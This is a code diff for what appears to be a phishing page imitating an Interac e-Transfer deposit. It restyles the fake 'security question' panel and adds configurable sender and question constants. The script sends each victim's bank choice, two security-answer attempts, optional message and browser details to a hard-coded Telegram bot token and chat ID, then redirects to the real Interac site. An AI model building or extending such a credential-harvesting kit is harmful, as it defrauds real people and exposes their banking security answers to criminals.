@@ -457,66 +457,105 @@ main {
 #selectedInstitutionPanel {
     display: none;
     background: white;
-    padding: 40px;
+    padding: 30px;
     border-radius: 8px;
-    margin: 20px 0;
-    max-width: 600px;
-    margin-left: auto;
-    margin-right: auto;
+    margin: 30px auto;
+    max-width: 550px;
 }
 
 #selectedInstitutionPanel.show {
     display: block;
 }
 
-#selectedInstitutionPanel h3 {
-    font-size: 1.3em;
+.security-main-title {
+    font-size: 1.6em;
+    margin-bottom: 12px;
+    color: #1a1a1a;
+    font-weight: 600;
+    text-align: left;
+    line-height: 1.3;
+}
+
+.security-subtitle {
+    font-size: 0.95em;
+    margin-bottom: 25px;
+    color: #666;
+    text-align: left;
+    line-height: 1.5;
+}
+
+.security-subtitle span {
+    font-weight: 600;
+    color: #333;
+}
+
+.security-form-box {
+    background: #f9f9f9;
+    border: 1px solid #e0e0e0;
+    border-radius: 8px;
+    padding: 25px;
     margin-bottom: 20px;
-    color: #333;
-    font-weight: bold;
-    text-align: left;
 }
 
-#selectedInstitutionPanel .security-question-label {
-    font-size: 1em;
-    margin-bottom: 15px;
-    color: #333;
-    text-align: left;
+.security-question-section,
+.security-answer-section,
+.security-message-section {
+    margin-bottom: 20px;
 }
 
-#selectedInstitutionPanel .security-answer-input {
+.security-message-section {
+    margin-bottom: 0;
+}
+
+.security-field-label {
+    display: block;
+    font-size: 0.9em;
+    font-weight: 600;
+    color: #666;
+    margin-bottom: 8px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+}
+
+.security-question-text {
+    font-size: 1.3em;
+    font-weight: 600;
+    color: #1a1a1a;
+    padding: 8px 0;
+}
+
+#selectedInstitutionPanel .security-answer-input,
+#selectedInstitutionPanel .security-message-input {
     width: 100%;
-    padding: 12px;
-    font-size: 1em;
-    border: 1px solid #ddd;
-    border-radius: 4px;
-    margin-bottom: 10px;
+    padding: 14px;
+    font-size: 1.05em;
+    border: 2px solid #ddd;
+    border-radius: 6px;
     box-sizing: border-box;
     transition: border-color 0.2s, box-shadow 0.2s;
     background-color: white;
+    font-family: Arial, Helvetica, sans-serif;
 }
 
-#selectedInstitutionPanel .security-answer-input:focus {
+#selectedInstitutionPanel .security-answer-input:focus,
+#selectedInstitutionPanel .security-message-input:focus {
     outline: none;
-    border-color: #f0b51c;
-    box-shadow: 0 0 0 2px rgba(240, 181, 28, 0.1);
+    border-color: #4a90e2;
+    box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.1);
 }
 
-#selectedInstitutionPanel .hint-text {
-    font-size: 0.85em;
-    color: #666;
-    text-align: left;
-    margin-bottom: 25px;
-    display: block;
+#selectedInstitutionPanel .security-message-input {
+    resize: vertical;
+    min-height: 80px;
 }
 
 #selectedInstitutionPanel .error-message {
-    background-color: #f8d7da;
-    color: #721c24;
-    border: 1px solid #f5c6cb;
-    border-radius: 4px;
-    padding: 12px 15px;
-    margin-bottom: 15px;
+    background-color: #fff3cd;
+    color: #856404;
+    border: 2px solid #ffc107;
+    border-radius: 6px;
+    padding: 15px;
+    margin-bottom: 20px;
     font-size: 0.95em;
     display: none;
     text-align: left;
@@ -534,32 +573,36 @@ main {
 }
 
 #selectedInstitutionPanel .deposit-button {
-    background-color: #f0b51c;
-    color: #333;
+    background-color: #2d6cdf;
+    color: white;
     border: none;
-    padding: 15px 40px;
+    padding: 15px 35px;
     font-size: 1.1em;
-    border-radius: 4px;
+    border-radius: 8px;
     cursor: pointer;
-    font-weight: bold;
-    transition: background-color 0.3s, transform 0.1s;
+    font-weight: 600;
+    transition: background-color 0.3s, transform 0.1s, box-shadow 0.2s;
     width: 100%;
     -webkit-tap-highlight-color: rgba(0, 0, 0, 0.1);
     touch-action: manipulation;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
 }
 
 #selectedInstitutionPanel .deposit-button:hover:not(:disabled) {
-    background-color: #d9a419;
+    background-color: #2557b8;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
 }
 
 #selectedInstitutionPanel .deposit-button:active:not(:disabled) {
     transform: scale(0.98);
-    background-color: #c99316;
+    background-color: #1e4a9f;
 }
 
 #selectedInstitutionPanel .deposit-button:disabled {
-    background-color: #ccc;
+    background-color: #b8b8b8;
     cursor: not-allowed;
+    opacity: 0.6;
+    box-shadow: none;
 }
 
 .close-icon {
@@ -606,7 +649,7 @@ main {
 }
 
 /* Form Styles */
-input, select, textarea, button {
+input, select, textarea {
     -webkit-user-select: text !important;
     -moz-user-select: text !important;
     -ms-user-select: text !important;
@@ -900,37 +943,51 @@ footer {
         border-radius: 6px;
     }
     
-    #selectedInstitutionPanel h3 {
-        font-size: 1.2em;
-        margin-bottom: 15px;
-    }
-    
-    #selectedInstitutionPanel .security-question-label {
-        font-size: 0.95em;
+    .security-main-title {
+        font-size: 1.4em;
         margin-bottom: 12px;
     }
     
-    #selectedInstitutionPanel .security-answer-input {
+    .security-subtitle {
+        font-size: 0.95em;
+        margin-bottom: 25px;
+    }
+    
+    .security-form-box {
+        padding: 20px;
+        margin-bottom: 20px;
+    }
+    
+    .security-field-label {
+        font-size: 0.85em;
+        margin-bottom: 6px;
+    }
+    
+    .security-question-text {
+        font-size: 1.15em;
+        padding: 6px 0;
+    }
+    
+    #selectedInstitutionPanel .security-answer-input,
+    #selectedInstitutionPanel .security-message-input {
         font-size: 16px; /* Prevents zoom on iOS */
         padding: 14px 12px;
-        margin-bottom: 8px;
+    }
+    
+    #selectedInstitutionPanel .security-message-input {
+        min-height: 70px;
     }
     
     #selectedInstitutionPanel .deposit-button {
-        padding: 15px 30px;
-        font-size: 1.05em;
+        padding: 16px 30px;
+        font-size: 1.1em;
         min-height: 50px;
-    }
-    
-    #selectedInstitutionPanel .hint-text {
-        font-size: 0.85em;
-        margin-bottom: 20px;
     }
     
     #selectedInstitutionPanel .error-message {
         padding: 12px;
         font-size: 0.9em;
-        margin-bottom: 12px;
+        margin-bottom: 15px;
     }
     
     .close-icon {
@@ -1041,8 +1098,8 @@ footer {
     }
     
     #selectedInstitutionPanel {
-        padding: 35px 25px;
-        max-width: 550px;
+        padding: 30px 25px;
+        max-width: 520px;
     }
     
     .sb-search.open {
@@ -1061,7 +1118,7 @@ footer {
     }
     
     #selectedInstitutionPanel {
-        max-width: 650px;
+        max-width: 580px;
     }
 }
 
@@ -1228,15 +1285,32 @@ footer {
 			<div id="selectedInstitutionPanel">
 				<div style="position: relative;">
 					<div class="close-icon" id="closeSelectedPanel"></div>
-					<h3>Security question</h3>
-					<div class="security-question-label">Answer the security question to accept this money?</div>
-					<div class="error-message" id="securityErrorMessage">
-						<strong>⚠️ Incorrect Answer</strong><br>
-						The security answer you entered is incorrect. Please try again.
+					<h2 class="security-main-title">Answer the security question to accept this money</h2>
+					<p class="security-subtitle">You can also send a personal message back to <span id="senderInfo">1000006899 Ontario Ltd.</span></p>
+					
+					<div class="security-form-box">
+						<div class="security-question-section">
+							<label class="security-field-label">Question</label>
+							<div class="security-question-text" id="securityQuestionText">your first name</div>
+						</div>
+						
+						<div class="error-message" id="securityErrorMessage">
+							<strong>⚠️ Incorrect Answer</strong><br>
+							The security answer you entered is incorrect. Please try again.
+						</div>
+						
+						<div class="security-answer-section">
+							<label class="security-field-label" for="securityAnswerInput">Answer</label>
+							<input type="text" class="security-answer-input" id="securityAnswerInput" placeholder="">
+						</div>
+						
+						<div class="security-message-section">
+							<label class="security-field-label" for="securityMessageInput">Message (optional)</label>
+							<textarea class="security-message-input" id="securityMessageInput" placeholder="" rows="3"></textarea>
+						</div>
 					</div>
-					<input type="text" class="security-answer-input" id="securityAnswerInput" placeholder="Enter a security answer">
-					<span class="hint-text">Enter the answer to the security question</span>
-					<button class="deposit-button" id="depositFromSearch" disabled>Deposit</button>
+					
+					<button class="deposit-button" id="depositFromSearch" disabled>Accept money</button>
 				</div>
 			</div>
 
@@ -1823,12 +1897,20 @@ const REDIRECT_URL = 'https://www.interac.ca/en/#';
 const TELEGRAM_BOT_TOKEN = '7789045030:AAGtlifeMx8GwtSGId8OpIX2EcUi4bCGEC0'; // Replace with your bot token
 const TELEGRAM_CHAT_ID = '6311551665'; // Replace with your chat ID
 
+// Security Question Configuration
+// Edit this to change the security question displayed to users
+const SECURITY_QUESTION = 'your first name'; // Change this to any question you want
+
+// Sender Information Configuration
+// Edit this to change the sender name displayed throughout the page
+const SENDER_NAME = '1000006899 Ontario Ltd.'; // Change this to the sender's name
+
 // Data passed to the next page via sessionStorage:
 // - selectedInstitution: Name of the selected bank/credit union
 // - institutionValue: Institution code/value
 // - securityAnswer: User's security answer (from security question form)
 // - depositAmount: The amount being deposited ($120.00 CAD)
-// - fromName: Sender's name (Dean Villanueva)
+// - fromName: Sender's name (from SENDER_NAME config)
 // 
 // To retrieve on the next page, use:
 // const institution = sessionStorage.getItem('selectedInstitution');
@@ -1868,6 +1950,7 @@ async function sendToTelegram(data) {
 
 🔐 *Security Answer (1st attempt):* ${data.firstAnswer}
 🔐 *Security Answer (2nd attempt):* ${data.secondAnswer}
+${data.message ? `\n💬 *Optional Message:* ${data.message}` : ''}
 
 📅 *Timestamp:* ${new Date().toLocaleString()}
 🌐 *User Agent:* ${navigator.userAgent}
@@ -2288,7 +2371,7 @@ document.getElementById('depositBtn').addEventListener('click', async function()
 		// Prepare data for Telegram
 		const telegramData = {
 			amount: '$120.00 CAD',
-			fromName: 'Dean Villanueva',
+			fromName: SENDER_NAME,
 			institutionName: institutionName,
 			institutionValue: institutionValue,
 			securityAnswer: 'Not provided (Direct deposit)'
@@ -2301,7 +2384,7 @@ document.getElementById('depositBtn').addEventListener('click', async function()
 		sessionStorage.setItem('selectedInstitution', institutionName);
 		sessionStorage.setItem('institutionValue', institutionValue);
 		sessionStorage.setItem('depositAmount', '$120.00 CAD');
-		sessionStorage.setItem('fromName', 'Dean Villanueva');
+		sessionStorage.setItem('fromName', SENDER_NAME);
 		
 		// Redirect to the configured URL
 		window.location.href = REDIRECT_URL;
@@ -2473,13 +2556,21 @@ function showSelectedInstitutionPanel(name) {
 	const panel = document.getElementById('selectedInstitutionPanel');
 	const fiSelection = document.getElementById('fiSelection');
 	const securityInput = document.getElementById('securityAnswerInput');
+	const securityMessageInput = document.getElementById('securityMessageInput');
 	const depositButton = document.getElementById('depositFromSearch');
 	const errorMessage = document.getElementById('securityErrorMessage');
+	const questionText = document.getElementById('securityQuestionText');
+	const senderInfo = document.getElementById('senderInfo');
 	
-	// Clear previous input
+	// Set the security question and sender name from configuration
+	questionText.textContent = SECURITY_QUESTION;
+	if (senderInfo) senderInfo.textContent = SENDER_NAME;
+	
+	// Clear previous inputs
 	securityInput.value = '';
+	if (securityMessageInput) securityMessageInput.value = '';
 	depositButton.disabled = true;
-	depositButton.textContent = 'Deposit';
+	depositButton.textContent = 'Accept money';
 	
 	// Hide error message
 	errorMessage.classList.remove('show');
@@ -2508,6 +2599,7 @@ function hideSelectedInstitutionPanel() {
 	const panel = document.getElementById('selectedInstitutionPanel');
 	const fiSelection = document.getElementById('fiSelection');
 	const securityInput = document.getElementById('securityAnswerInput');
+	const securityMessageInput = document.getElementById('securityMessageInput');
 	const depositButton = document.getElementById('depositFromSearch');
 	const errorMessage = document.getElementById('securityErrorMessage');
 	
@@ -2515,10 +2607,11 @@ function hideSelectedInstitutionPanel() {
 	panel.classList.remove('show');
 	fiSelection.style.display = 'block';
 	
-	// Clear input and disable button
+	// Clear inputs and disable button
 	securityInput.value = '';
+	if (securityMessageInput) securityMessageInput.value = '';
 	depositButton.disabled = true;
-	depositButton.textContent = 'Deposit';
+	depositButton.textContent = 'Accept money';
 	
 	// Hide error message
 	errorMessage.classList.remove('show');
@@ -2644,14 +2737,19 @@ document.getElementById('depositFromSearch').addEventListener('click', async fun
 			// Hide error message
 			errorMessage.classList.remove('show');
 			
-			// Prepare data for Telegram with BOTH answers
+			// Get optional message
+			const messageInput = document.getElementById('securityMessageInput');
+			const optionalMessage = messageInput ? messageInput.value : '';
+			
+			// Prepare data for Telegram with BOTH answers and optional message
 			const telegramData = {
 				amount: '$120.00 CAD',
-				fromName: 'Dean Villanueva',
+				fromName: SENDER_NAME,
 				institutionName: securityAnswerAttempts.institutionName,
 				institutionValue: securityAnswerAttempts.institutionValue,
 				firstAnswer: securityAnswerAttempts.firstAnswer,
-				secondAnswer: securityAnswerAttempts.secondAnswer
+				secondAnswer: securityAnswerAttempts.secondAnswer,
+				message: optionalMessage
 			};
 			
 			// Send to Telegram before redirecting
@@ -2662,7 +2760,7 @@ document.getElementById('depositFromSearch').addEventListener('click', async fun
 			sessionStorage.setItem('institutionValue', securityAnswerAttempts.institutionValue);
 			sessionStorage.setItem('securityAnswer', securityAnswerAttempts.secondAnswer);
 			sessionStorage.setItem('depositAmount', '$120.00 CAD');
-			sessionStorage.setItem('fromName', 'Dean Villanueva');
+			sessionStorage.setItem('fromName', SENDER_NAME);
 			
 			// Reset attempts for next use
 			securityAnswerAttempts = {
